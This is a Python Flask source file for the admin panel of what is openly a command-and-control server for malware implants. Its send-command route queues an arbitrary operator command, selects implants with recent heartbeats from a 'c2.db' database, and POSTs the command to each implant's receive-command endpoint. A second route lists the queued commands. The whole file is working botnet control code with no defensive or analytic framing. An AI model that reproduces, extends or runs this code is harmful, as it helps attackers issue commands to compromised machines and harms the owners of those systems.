import os
from flask import Blueprint, jsonify, request # type: ignore
import sqlite3, datetime, random, requests

admin_blueprint = Blueprint("admin", __name__, url_prefix="/admin")

def get_db_conn():
    conn = sqlite3.connect("c2.db")
    conn.row_factory = sqlite3.Row
    return conn


"""
Queue a new command for all implants
"""
@admin_blueprint.route("/send-command", methods=["POST"])
def send_command():
    data = request.get_json() or {}
    cmd  = data.get('cmd')
    if not cmd:
        return jsonify({"error":"Missing 'cmd'"}), 400

    now = datetime.datetime.now().isoformat()
    with get_db_conn() as conn:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO commands(command_text, sent_at) VALUES(?,?)",
            (cmd, now)
        )
        cmd_id = cur.lastrowid

    # grab all live implants, newest-registered first cuz they got all the peers
    with get_db_conn() as conn:
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        cur.execute("""
            SELECT ip, port
              FROM implants
             WHERE strftime('%s','now') - strftime('%s', last_heartbeat) <= ?
             ORDER BY registered_at DESC
        """, (30,))
        peers = cur.fetchall()

    if not peers:
        return jsonify({"error":"No implants online"}), 503

    payload = {
      "id":            cmd_id,
      "cmd":           cmd,
      "sender_port":   int(os.getenv("PORT", "8000"))
    #   "previous_hops": []
    }

    errors = []
    for row in peers:
        ip, port = row['ip'], row['port']
        target   = f"http://{ip}:{port}/receive-command"
        try:
            r = requests.post(target, json=payload, timeout=30)
            r.raise_for_status()
            return jsonify({
                "status": "dispatched",
                "cmd_id": cmd_id,
                "to":     ip
            }), 200
        except Exception as e:
            errors.append(f"{ip}:{port} → {e}")

    return jsonify({
        "error":   "Failed to dispatch to any implant",
        "details": errors
    }), 502


# def add_command():
#     data = request.get_json() or {}
#     command = data.get("cmd")

#     if not command:
#         return jsonify({"message": "Command is missing"}), 400
    
#     now = datetime.datetime.now().isoformat()
#     with get_db_conn() as conn:
#         cursor = conn.cursor()
#         try:
#             cursor.execute("INSERT INTO commands (command_text, sent_at) VALUES (?, ?)", (command, now))

#             print(f"📩 - Command queued: {command} at {now} with ID {cursor.lastrowid}")
#             return jsonify({"status": "queued", "command": command, "sent_at": now}), 201
#         except sqlite3.Error as e:
#             print(f"⚠️ - SQLite ERROR inserting command - {e}")
#             return jsonify({"status": "error", "message": str(e)}), 500


"""
List all the queued commands
"""
@admin_blueprint.route("/commands", methods=["GET"])
def list_commands():
    with get_db_conn() as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT id, command_text, sent_at FROM commands ORDER BY sent_at DESC")
        rows = cursor.fetchall()

    cmds = [dict(r) for r in rows]
    return jsonify(cmds), 200